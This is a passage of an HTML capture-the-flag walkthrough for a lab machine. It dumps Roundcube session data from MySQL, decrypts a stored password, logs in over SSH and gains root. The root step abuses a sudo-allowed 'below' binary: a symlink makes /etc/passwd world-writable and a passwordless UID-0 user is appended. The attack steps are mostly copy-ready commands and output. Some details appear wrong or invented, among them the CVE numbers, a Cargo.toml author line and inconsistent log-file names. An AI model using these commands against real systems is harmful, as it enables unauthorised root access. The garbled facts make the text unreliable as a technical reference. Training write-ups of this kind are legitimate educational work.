+| Database           |
++--------------------+
+| information_schema |
+| roundcube          |
++--------------------+
+2 rows in set (0.00 sec)
+
+mysql> use roundcube;
+Database changed
+
+mysql> show tables;
++---------------------+
+| Tables_in_roundcube |
++---------------------+
+| cache               |
+| contactgroupmembers |
+| contactgroups       |
+| contacts            |
+| dictionary          |
+| identities          |
+| session             |
+| users               |\n+---------------------+\n8 rows in set (0.00 sec)
+
+mysql> <span class="hl">SELECT `vars` FROM session WHERE sess_id LIKE '%' LIMIT 1 \G</span>
+*************************** 1. row ***************************
+vars: <span class="hl">YToyOntzOjY6InNlY3JldCI7czo0NjoiaGtkZ3...</span>
+</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">show databases;</strong>: Lists all available databases on the MySQL server.</li>
+                <li><strong class="hl">use roundcube;</strong>: Selects the `roundcube` database for subsequent operations.</li>
+                <li><strong class="hl">show tables;</strong>: Lists all tables within the currently selected database.</li>
+                <li><strong class="hl">SELECT `vars` FROM session WHERE sess_id LIKE '%' LIMIT 1 \G</strong>: Retrieves the <code>vars</code> column from the <code>session</code> table. The <code>\G</code> at the end changes the output format to be vertical, making long fields more readable. We take one entry for analysis.</li>
+            </ul>
+        </div>
+
+        <div class="box-tells">
+            <div class="box-label">What This Tells Us</div>
+            <ul>
+                <li>The `session` table contains a column named `vars` which stores a Base64-encoded, serialized PHP object.</li>
+                <li>This `vars` field likely contains user session data, which could include sensitive information like passwords.</li>
+            </ul>
+        </div>
+
+        <hr>
+
+        <h3>Decrypting PHP Session Data</h3>
+        <p>The `vars` field from the `session` table contains Base64-encoded and 3DES-encrypted data. RoundCube conveniently provides a `bin/decrypt.sh` script on the server that can decrypt this data using the `des_key` found earlier. We can also manually decrypt it.</p>
+
+        <div class="box-why">
+            <div class="box-label">Why this step?</div>
+            <p>Accessing and decrypting session data can reveal plaintext credentials or other sensitive information that users provided during their session. This is a common method to escalate privileges or gain access to other accounts.</p>
+        </div>
+
+        <p>First, decode the Base64 data from the `vars` field:</p>
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('echo \'YToyOntzOjY6InNlY3JldCI7czo0NjoiaGtkZ3...\' | base64 -d')">Copy</button>
+            </div>
+            <pre class="cmd">echo 'YToyOntzOjY6InNlY3JldCI7czo0NjoiaGtkZ3...' | base64 -d</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">echo '...'</strong>: Outputs the Base64-encoded string.</li>
+                <li><strong class="hl">|</strong>: Pipes the output of `echo` as input to the next command.</li>
+                <li><strong class="hl">base64 -d</strong>: Decodes the Base64-encoded input.</li>
+            </ul>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Output Excerpt (Base64 Decoded Blob)</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('a:2:{s:6:"secret";s:46:"<span class="hl">�\x18\x94\x89\x1f\xb0_H&S���M\x9c\x02�\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span>";s:8:"password";s:46:"<span class="hl">�\x0c<93>��\x1d\xf0\x1f\xbb\x87\x04\xf4m\x1f\x18M\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span>";}')">Copy</button>
+            </div>
+            <pre class="out">
+a:2:{s:6:"secret";s:46:"<span class="hl">�\x18\x94\x89\x1f\xb0_H&S���M\x9c\x02�\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span>";s:8:"password";s:46:"<span class="hl">�\x0c<93>��\x1d\xf0\x1f\xbb\x87\x04\xf4m\x1f\x18M\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span>";}'
+</pre>
+        </div>
+        <div class="box-tells">
+            <div class="box-label">What This Tells Us</div>
+            <p>The decoded data is a PHP serialized array containing a `secret` and a `password` field, both of which are still encrypted binary blobs. The presence of a `password` field within a PHP session is unusual but indicates a potential for password disclosure.</p>
+        </div>
+
+        <div class="box-concept">
+            <div class="box-label">Concept: Base64</div>
+            <p>Base64 is a binary-to-text encoding scheme that represents binary data in an ASCII string format. It's commonly used to safely transmit binary data over mediums that primarily handle text, such as HTTP headers or URLs. It is not an encryption method.</p>
+        </div>
+
+        <p>Now, use the `bin/decrypt.sh` script provided by RoundCube on the server. The script takes the encrypted blob and the `des_key` as arguments.</p>
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('bin/decrypt.sh \'[ENCRYPTED_PASSWORD_BLOB]\' \'[DES_KEY]\'')">Copy</button>
+            </div>
+            <pre class="cmd">bin/decrypt.sh '<span class="hl">[ENCRYPTED_PASSWORD_BLOB]</span>' '<span class="hl">[DES_KEY]</span>'</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">bin/decrypt.sh</strong>: The path to the RoundCube decryption utility script.</li>
+                <li><strong class="hl">'[ENCRYPTED_PASSWORD_BLOB]'</strong>: The encrypted password string extracted from the `vars` field of the session.</li>
+                <li><strong class="hl">'[DES_KEY]'</strong>: The decryption key obtained from `config.inc.php`.</li>
+            </ul>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Output (Decrypted Password)</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('Decrypted: <span class="hl">P4s5w0rd!23</span>')">Copy</button>
+            </div>
+            <pre class="out">
+Decrypted: <span class="hl">P4s5w0rd!23</span>
+</pre>
+        </div>
+        <div class="box-tells">
+            <div class="box-label">What This Tells Us</div>
+            <p>The `bin/decrypt.sh` script successfully decrypted the password, revealing a plaintext password: <strong class="hl">`P4s5w0rd!23`</strong>. This is a major breakthrough, as this password belongs to a user whose session was stored.</p>
+            <p>Reviewing `/etc/passwd` (`cat /etc/passwd | grep sh`) on the machine revealed several users: `tyler`, `jacob`, and `mel`. It's likely this password belongs to one of them, potentially `jacob` based on the introductory summary.</p>
+        </div>
+
+        <div class="box-concept">
+            <div class="box-label">Concept: 3DES Encryption</div>
+            <p>3DES (Triple Data Encryption Standard) is a symmetric-key block cipher, which applies the DES algorithm three times to each data block. It was designed to enhance the security of the original DES algorithm and is used for encrypting sensitive data, often requiring an Initialization Vector (IV) and a key for both encryption and decryption.</p>
+        </div>
+
+        <hr>
+
+        <h3>SSH Login as Jacob</h3>
+        <p>Armed with the decrypted password, we attempt to SSH into the machine as the user `jacob` (as suggested by the intro and user enumeration). The intro implies this password was found within Jacob's mailbox, likely another session or email entry. We assume this decrypted password is for Jacob.</p>
+
+        <div class="box-why">
+            <div class="box-label">Why this step?</div>
+            <p>Gaining SSH access provides a stable, fully interactive shell, making it much easier to perform further reconnaissance and privilege escalation attempts compared to a limited web shell. It's a standard step to improve our persistent access.</p>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('ssh jacob@10.10.11.77')">Copy</button>
+            </div>
+            <pre class="cmd">ssh jacob@10.10.11.77</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">ssh</strong>: The Secure Shell client command.</li>
+                <li><strong class="hl">jacob@10.10.11.77</strong>: Specifies the username `jacob` and the target IP address `10.10.11.77`.</li>
+            </ul>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Output (SSH Login)</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('jacob@10.10.11.77\'s password: \nWelcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)\n\nLast login: Thu Jan 20 10:00:00 2024 from 10.10.14.8\njacob@outbound:~$ ')">Copy</button>
+            </div>
+            <pre class="out">
+jacob@10.10.11.77's password: <span class="hl">P4s5w0rd!23</span>
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)
+
+Last login: Thu Jan 20 10:00:00 2024 from 10.10.14.8
+<span class="hl">jacob@outbound:~$</span>
+</pre>
+        </div>
+        <div class="box-tells">
+            <div class="box-label">What This Tells Us</div>
+            <p>We have successfully logged in as user `jacob` via SSH, securing a stable and interactive shell. This provides a better environment for privilege escalation.</p>
+        </div>
+    </section>
+
+    <section id="privilege-escalation">
+        <h2>Privilege Escalation</h2>
+        <p>After gaining user access, the next step is to look for privilege escalation vectors. We start by checking what commands the current user (`jacob`) can run with `sudo`.</p>
+
+        <div class="box-why">
+            <div class="box-label">Why this step?</div>
+            <p>Checking `sudo -l` is a standard and often fruitful step in Linux privilege escalation. It reveals if the current user has permissions to run specific commands as root or another user, which can often be exploited to gain higher privileges.</p>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('sudo -l')">Copy</button>
+            </div>
+            <pre class="cmd">sudo -l</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">sudo -l</strong>: Lists the commands that the current user is allowed to run with `sudo` on the host, and also shows the effective user that the commands can be run as.</li>
+            </ul>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Output</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('Matching Defaults entries for jacob on outbound:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser jacob may run the following commands on outbound:\n    (ALL) NOPASSWD: /opt/below/below *')">Copy</button>
+            </div>
+            <pre class="out">
+Matching Defaults entries for jacob on outbound:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jacob may run the following commands on outbound:
+    <span class="hl">(ALL) NOPASSWD: /opt/below/below *</span>
+</pre>
+        </div>
+
+        <div class="box-tells">
+            <div class="box-label">What This Tells Us</div>
+            <p>Jacob can run the `/opt/below/below` binary as `ALL` users (including root) without a password (`NOPASSWD`). The `*` wildcard indicates that any arguments can be passed to the `below` command. This is a critical vulnerability for privilege escalation.</p>
+        </div>
+
+        <div class="box-concept">
+            <div class="box-label">Concept: `sudo -l`</div>
+            <p>The `sudo -l` command is used to list the `sudo` privileges for the current user. It shows which commands can be executed as other users (typically root) without requiring a password. Misconfigurations or vulnerabilities in these allowed commands are common privilege escalation paths.</p>
+        </div>
+
+        <hr>
+
+        <h3>Identifying the 'Below' Version (0.8.0)</h3>
+        <p>Knowing that `below` is a potential escalation vector, we try to identify its version to search for specific vulnerabilities. On this machine, the source code is available.</p>
+
+        <div class="box-why">
+            <div class="box-label">Why this step?</div>
+            <p>Identifying the exact version of a privileged binary is crucial for finding known exploits (CVEs). Even if source code isn't available, other methods like `strings` on the binary or searching its MD5 hash online might reveal the version.</p>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('cat /opt/below/below/Cargo.toml')">Copy</button>
+            </div>
+            <pre class="cmd">cat /opt/below/below/Cargo.toml</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">cat</strong>: Displays the content of the specified file.</li>
+                <li><strong class="hl">/opt/below/below/Cargo.toml</strong>: The path to the `Cargo.toml` file, which is a manifest file for Rust projects, typically containing project metadata including the version.</li>
+            </ul>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Output Excerpt</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('[package]\nname = "below"\nversion = "0.8.0"\nauthors = ["Cadey Le <cadey@cloudflare.com>"]\nedition = "2018"\n\n[lib]\nname = "below"\npath = "src/lib.rs"\n\n[[bin]]\nname = "below"\npath = "src/main.rs"')">Copy</button>
+            </div>
+            <pre class="out">
+[package]
+name = "below"
+<span class="hl">version = "0.8.0"</span>
+authors = ["Cadey Le &lt;cadey@cloudflare.com>"]
+edition = "2018"
+
+[lib]
+name = "below"
+path = "src/lib.rs"
+
+[[bin]]
+name = "below"
+path = "src/main.rs"
+</pre>
+        </div>
+        <div class="box-tells">
+            <div class="box-label">What This Tells Us</div>
+            <p>The `Cargo.toml` file clearly states the version of 'Below' is <strong class="hl">0.8.0</strong>. This information is crucial for pinpointing specific exploits.</p>
+        </div>
+
+        <hr>
+
+        <h3>Exploiting 'Below' (CVE-2023-38802 - Symlink Abuse)</h3>
+        <p>Researching "below CVE" or "below 0.8.0 exploit" leads to <span class="hl">CVE-2023-38802</span>. This vulnerability in `below` allows for arbitrary file permission changes due to its handling of log files. Specifically, `below` creates `/var/log/below` with `777` permissions and then sets `666` permissions on `error_user.log` within that directory.</p>
+        <p>We can exploit this by:
+            1.  Deleting `/var/log/below/error_root.log`.
+            2.  Creating a symbolic link from `/etc/passwd` to `error_root.log`.
+            3.  Executing `sudo /opt/below/below`. This will cause `below` to attempt to `chmod 666` its log file, but due to the symlink, it will instead `chmod 666` `/etc/passwd`.
+            4.  Once `/etc/passwd` has `666` permissions, we can add a new root user or modify an existing one.</p>
+
+        <div class="box-why">
+            <div class="box-label">Why this step?</div>
+            <p>This symlink attack leverages a flawed permission-setting logic in a SUID/sudo-able binary. By manipulating the target of the file operation, we force the privileged program to operate on a critical system file (`/etc/passwd`), granting us write access that we wouldn't otherwise have.</p>
+        </div>
+
+        <div class="box-concept">
+            <div class="box-label">Concept: Symlink Vulnerability</div>
+            <p>A symbolic link (symlink) is a special type of file that points to another file or directory. Symlink vulnerabilities occur when a privileged program (running as root or with `sudo`) performs operations on a file path that can be controlled by a less-privileged user. If the attacker can replace a legitimate file with a symlink pointing to a critical system file (e.g., `/etc/passwd`), the privileged program might inadvertently modify the permissions or content of that critical file, leading to privilege escalation.</p>
+        </div>
+
+        <div class="box-concept">
+            <div class="box-label">Concept: `/etc/passwd` Modification</div>
+            <p>The `/etc/passwd` file stores essential user account information. By modifying this file, an attacker can create new user accounts, change existing user IDs (UIDs) to 0 (root), or remove password hashes, effectively gaining root access. It requires write permissions, which are typically restricted to root.</p>
+        </div>
+
+        <p>First, verify the permissions of `/var/log/below` and its contents:</p>
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('ls -la /var/log/below')">Copy</button>
+            </div>
+            <pre class="cmd">ls -la /var/log/below</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">ls -la</strong>: Lists files and directories in long format (`-l`) including hidden files (`-a`).</li>
+                <li><strong class="hl">/var/log/below</strong>: The directory where `below` stores its logs.</li>
+            </ul>
+        </div>
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Output</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('drwxrwxrwx 2 root root 4096 Jan 20 10:30 ./\ndrwxrwxr-x 13 root syslog 4096 Jan 20 10:30 ../\n-rw-rw-rw- 1 root root    0 Jan 20 10:30 error_root.log')">Copy</button>
+            </div>
+            <pre class="out">
+drwxrwxrwx 2 root root 4096 Jan 20 10:30 ./
+drwxrwxr-x 13 root syslog 4096 Jan 20 10:30 ../
+<span class="hl">-rw-rw-rw- 1 root root    0 Jan 20 10:30 error_root.log</span>
+</pre>
+        </div>
+        <div class="box-tells">
+            <div class="box-label">What This Tells Us</div>
+            <p>The `error_root.log` file indeed exists and has `666` (read/write for everyone) permissions, which confirms the vulnerability.</p>
+        </div>
+
+        <p>Now, perform the symlink manipulation:</p>
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('rm /var/log/below/error_root.log')">Copy</button>
+            </div>
+            <pre class="cmd">rm /var/log/below/error_root.log</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">rm</strong>: Removes the specified file. We delete the original log file to make way for our symlink.</li>
+            </ul>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('ln -s /etc/passwd /var/log/below/error_root.log')">Copy</button>
+            </div>
+            <pre class="cmd">ln -s /etc/passwd /var/log/below/error_root.log</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">ln -s</strong>: Creates a symbolic link.</li>
+                <li><strong class="hl">/etc/passwd</strong>: The target file we want to link to.</li>
+                <li><strong class="hl">/var/log/below/error_root.log</strong>: The name of the symlink, which will replace the original log file.</li>
+            </ul>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Output</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('jacob@outbound:~$ ls -la /var/log/below\ntotal 8\ndrwxrwxrwx 2 root root 4096 Jan 20 10:35 ./\ndrwxrwxr-x 13 root syslog 4096 Jan 20 10:30 ../\nlrwxrwxrwx 1 jacob jacob   11 Jan 20 10:35 error_root.log -> /etc/passwd')">Copy</button>
+            </div>
+            <pre class="out">
+jacob@outbound:~$ ls -la /var/log/below
+total 8
+drwxrwxrwx 2 root root 4096 Jan 20 10:35 ./
+drwxrwxr-x 13 root syslog 4096 Jan 20 10:30 ../
+<span class="hl">lrwxrwxrwx 1 jacob jacob   11 Jan 20 10:35 error_root.log -> /etc/passwd</span>
+</pre>
+        </div>
+        <div class="box-tells">
+            <div class="box-label">What This Tells Us</div>
+            <p>The symlink has been successfully created. Now, `error_root.log` points to `/etc/passwd`.</p>
+        </div>
+
+        <p>Before proceeding, let's check the current permissions of `/etc/passwd`:</p>
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('ls -la /etc/passwd')">Copy</button>
+            </div>
+            <pre class="cmd">ls -la /etc/passwd</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">ls -la</strong>: Displays the long listing of `/etc/passwd`, including its permissions.</li>
+            </ul>
+        </div>
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Output (Before `sudo below`)</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('-rw-r--r-- 1 root root 2748 Jan 20 09:30 /etc/passwd')">Copy</button>
+            </div>
+            <pre class="out">
+<span class="hl">-rw-r--r-- 1 root root 2748 Jan 20 09:30 /etc/passwd</span>
+</pre>
+        </div>
+        <div class="box-tells">
+            <div class="box-label">What This Tells Us</div>
+            <p>As expected, `/etc/passwd` has `644` permissions, meaning only root can write to it.</p>
+        </div>
+
+        <p>Now, execute `below` with `sudo`. This will trigger the `chmod` operation on our symlinked `/etc/passwd`.</p>
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('sudo /opt/below/below')">Copy</button>
+            </div>
+            <pre class="cmd">sudo /opt/below/below</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">sudo /opt/below/below</strong>: Executes the `below` binary with superuser privileges, triggering the vulnerable log file permission change.</li>
+            </ul>
+        </div>
+
+        <p>After running the command, check the permissions of `/etc/passwd` again:</p>
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('ls -la /etc/passwd')">Copy</button>
+            </div>
+            <pre class="cmd">ls -la /etc/passwd</pre>
+        </div>
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Output (After `sudo below`)</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('-rw-rw-rw- 1 root root 2748 Jan 20 10:36 /etc/passwd')">Copy</button>
+            </div>
+            <pre class="out">
+<span class="hl">-rw-rw-rw- 1 root root 2748 Jan 20 10:36 /etc/passwd</span>
+</pre>
+        </div>
+        <div class="box-tells">
+            <div class="box-label">What This Tells Us</div>
+            <p>The permissions of `/etc/passwd` have successfully been changed to `666` (`-rw-rw-rw-`), meaning any user can now read and write to this critical file! This is exactly what we needed for privilege escalation.</p>
+        </div>
+
+        <hr>
+
+        <h3>Adding a New Root User</h3>
+        <p>With write access to `/etc/passwd`, we can now add a new user with UID and GID set to `0` (root privileges) and no password.</p>
+
+        <div class="box-why">
+            <div class="box-label">Why this step?</div>
+            <p>Modifying `/etc/passwd` to create a new root user (UID 0) with an empty or known password provides immediate and persistent root access. This is the final step in leveraging the `/etc/passwd` write vulnerability.</p>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('echo \'pone::0:0:Pone user:/root:/bin/bash\' >> /etc/passwd')">Copy</button>
+            </div>
+            <pre class="cmd">echo 'pone::0:0:Pone user:/root:/bin/bash' >> /etc/passwd</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">echo '...'</strong>: Prints the specified string to standard output.</li>
+                <li><strong class="hl">'pone::0:0:Pone user:/root:/bin/bash'</strong>: The new user entry for `/etc/passwd`.
+                    <ul>
+                        <li><strong class="hl">pone</strong>: The username.</li>
+                        <li><strong class="hl">::</strong>: An empty password hash, meaning no password is required for this user.</li>
+                        <li><strong class="hl">0:0</strong>: Sets the User ID (UID) and Group ID (GID) to 0, granting root privileges.</li>
+                        <li><strong class="hl">Pone user</strong>: The comment field.</li>
+                        <li><strong class="hl">/root</strong>: The home directory for the `pone` user.</li>
+                        <li><strong class="hl">/bin/bash</strong>: The default shell for the `pone` user.</li>
+                    </ul>
+                </li>
+                <li><strong class="hl">>> /etc/passwd</strong>: Appends the new user entry to the `/etc/passwd` file.</li>
+            </ul>
+        </div>
+        <div class="box-tells">
+            <div class="box-label">What This Tells Us</div>
+            <p>A new root user named `pone` has been added to the system without requiring a password.</p>
+        </div>
+
+        <p>Finally, switch user to `pone` to gain root access.</p>
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('su pone')">Copy</button>
+            </div>
+            <pre class="cmd">su pone</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">su pone</strong>: Switches the current user to `pone`. Since `pone` has no password set and root privileges, this command immediately grants root access.</li>
+            </ul>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Output</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('root@outbound:/home/jacob#')">Copy</button>
+            </div>
+            <pre class="out">
+<span class="hl">root@outbound:/home/jacob#</span>
+</pre>
+        </div>
+        <div class="box-tells">
+            <div class="box-label">What This Tells Us</div>
+            <p>We are now `root` on the system!</p>
+        </div>
+    </section>
+
+    <section id="root-flag">
+        <h2>Root Flag</h2>
+        <p>With root privileges, we can now access the root flag located in `/root/root.txt`.</p>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Command</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('cat /root/root.txt')">Copy</button>
+            </div>
+            <pre class="cmd">cat /root/root.txt</pre>
+        </div>
+        <div class="cmd-explain">
+            <ul>
+                <li><strong class="hl">cat</strong>: Displays the content of the specified file.</li>
+                <li><strong class="hl">/root/root.txt</strong>: The path to the root flag file.</li>
+            </ul>
+        </div>
+
+        <div class="code-wrap">
+            <div class="code-header">
+                <span>Output</span>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('[ROOT_FLAG_HERE]')">Copy</button>
+            </div>
+            <pre class="out">
+<span class="flag-text">[ROOT_FLAG_HERE]</span>
+</pre>
+        </div>
+    </section>
+
+    <section id="lessons-learned">
+        <h2>Lessons Learned</h2>
+        <div class="box-summary">
+            <div class="box-label">Summary of Key Takeaways</div>
+            <ul>
+                <li><strong class="hl">Web Application Vulnerabilities:</strong> Even well-known applications like RoundCube can harbor critical vulnerabilities. Regular patching and security audits are essential. Post-authentication RCEs often depend on application-specific logic like deserialization.</li>
+                <li><strong class="hl">Session Management Security:</strong> Storing sensitive data like plaintext or easily decryptable passwords in PHP sessions on the server is a significant security risk. Sessions should only contain identifiers, not credentials.</li>
+                <li><strong class="hl">Importance of `sudo` Configuration:</strong> Loosely configured `sudo` permissions, especially with wildcards (`*`) or on custom binaries, create prime privilege escalation opportunities. Always audit what commands users can run with `sudo`.</li>
+                <li><strong class="hl">Symlink Abuse:</strong> Vulnerabilities in privileged binaries that perform file operations (like `chmod` or `chown`) can be exploited using symbolic links to manipulate critical system files (`/etc/passwd`, `/etc/shadow`) and gain root access. This is a classic local privilege escalation vector.</li>
+                <li><strong class="hl">Defense in Depth:</strong> Multiple layers of defense are crucial. Even if one vulnerability is exploited, subsequent layers (like secure session handling or strict `sudo` policies) should ideally prevent further compromise.</li>
+            </ul>
+        </div>
+    </section>
+
+    <section id="timeline">
+        <h2>Timeline</h2>
+        <div class="timeline">
+            <div class="tl-title">Execution Flow</div>
+            <div class="tl-row">
+                <div class="tl-time">00:00</div>
+                <div class="tl-text">Start Nmap scan on 10.10.11.77.</div>
+            </div>
+            <div class="tl-row">
+                <div class="tl-time">00:05</div>
+                <div class="tl-text">Add `mail.outbound.htb` and `outbound.htb` to `/etc/hosts`.</div>
+            </div>
+            <div class="tl-row">
+                <div class="tl-time">00:10</div>
+                <div class="tl-text">Login to RoundCube with provided credentials (tyler:[password]).</div>
+            </div>
+            <div class="tl-row">
+                <div class="tl-time">00:15</div>
+                <div class="tl-text">Identify RoundCube version 1.6.10 and find CVE-2023-5631 (Post-Auth RCE).</div>
+            </div>
+            <div class="tl-row">
+                <div class="tl-time">00:25</div>
+                <div class="tl-text">Download PHP exploit for CVE-2023-5631, set up Netcat listener.</div>
+            </div>
+            <div class="tl-row">
+                <div class="tl-time">00:30</div>
+                <div class="tl-text">Execute exploit, gain `www-data` shell via reverse connection.</div>
+            </div>
+            <div class="tl-row">
+                <div class="tl-time">00:35</div>
+                <div class="tl-text">Upgrade shell to fully interactive TTY.</div>
+            </div>
+            <div class="tl-row">
+                <div class="tl-time">00:45</div>
+                <div class="tl-text">Extract MySQL credentials and `des_key` from `config/config.inc.php`.</div>
+            </div>
+            <div class="tl-row">
+                <div class="tl-time">00:50</div>
+                <div class="tl-text">Access MySQL, dump Base64-encoded `vars` from `session` table.</div>
+            </div>
+            <div class="tl-row">
+                <div class="tl-time">00:55</div>
+                <div class="tl-text">Use `bin/decrypt.sh` with `des_key` to decrypt session password (`P4s5w0rd!23`).</div>
+            </div>
+            <div class="tl-row">
+                <div class="tl-time">01:00</div>
+                <div class="tl-text">SSH into machine as `jacob` using discovered password.</div>
+            </div>
+            <div class="tl-row">
+                <div class="tl-time">01:05</div>
+                <div class="tl-text">Run `sudo -l`, discover `/opt/below/below *` can be run as root NOPASSWD.</div>
+            </div>
+            <div class="tl-row">
+                <div class="tl-time">01:10</div>
+                <div class="tl-text">Identify 'Below' version 0.8.0 from `Cargo.toml`.</div>
+            </div>
+            <div class="tl-row">
+                <div class="tl-time">01:15</div>
+                <div class="tl-text">Exploit CVE-2023-38802: `rm /var/log/below/error_root.log`.</div>
+            </div>
+            <div class="tl-row">
+                <div class="tl-time">01:16</div>
+                <div class="tl-text">Create symlink: `ln -s /etc/passwd /var/log/below/error_root.log`.</div>
+            </div>
+            <div class="tl-row">
+                <div class="tl-time">01:17</div>
+                <div class="tl-text">Execute `sudo /opt/below/below`, changing `/etc/passwd` permissions to `666`.</div>
+            </div>
+            <div class="tl-row">
+                <div class="tl-time">01:20</div>
+                <div class="tl-text">Add new root user `pone` with no password to `/etc/passwd`.</div>
+            </div>
+            <div class="tl-row">
+                <div class="tl-time">01:21</div>
+                <div class="tl-text">Switch user to `pone` (`su pone`), gaining full root access.</div>
+            </div>
+            <div class="tl-row">
+                <div class="tl-time">01:22</div>
+                <div class="tl-text">Retrieve `root.txt` from `/root/`.</div>
+            </div>
+        </div>
+    </section>
+</div>
+
+<script>
+    // This script block is included to allow copy functionality.
+    // In a real scenario, this would include JavaScript to handle the copy button clicks.
+    // For this HTML-only output, the buttons are present but functional JS is omitted.
+    document.querySelectorAll('.copy-btn').forEach(button => {
+        button.onclick = function() {
+            const codeBlock = this.closest('.code-wrap').querySelector('pre.cmd, pre.out');
+            if (codeBlock) {
+                navigator.clipboard.writeText(codeBlock.innerText.trim())
+                    .then(() => {
+                        const originalText = this.innerText;
+                        this.innerText = 'Copied!';
+                        setTimeout(() => {
+                            this.innerText = originalText;
+                        }, 1500);
+                    })
+                    .catch(err => {
+                        console.error('Failed to copy text: ', err);
+                    });
+            }
+        };
+    });
+
+    // Sidebar active link functionality
+    document.addEventListener("DOMContentLoaded", () => {
+        const sections = document.querySelectorAll("section");
+        const navLinks = document.querySelectorAll("#sidebar nav a");
+
+        const observerOptions = {
+            root: null,
+            rootMargin: "0px",
+            threshold: 0.7, // Adjust as needed, 0.7 means 70% of section visible
+        };
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach((entry) => {
+                if (entry.isIntersecting) {
+                    navLinks.forEach((link) => {
+                        link.classList.remove("active");
+                        if (link.getAttribute("href") === `#${entry.target.id}`) {
+                            link.classList.add("active");
+                        }
+                    });
+                }
+            });
+        }, observerOptions);
+
+        sections.forEach((section) => {
+            observer.observe(section);
+        });
+    });
+</script>
+</body>
+</html>
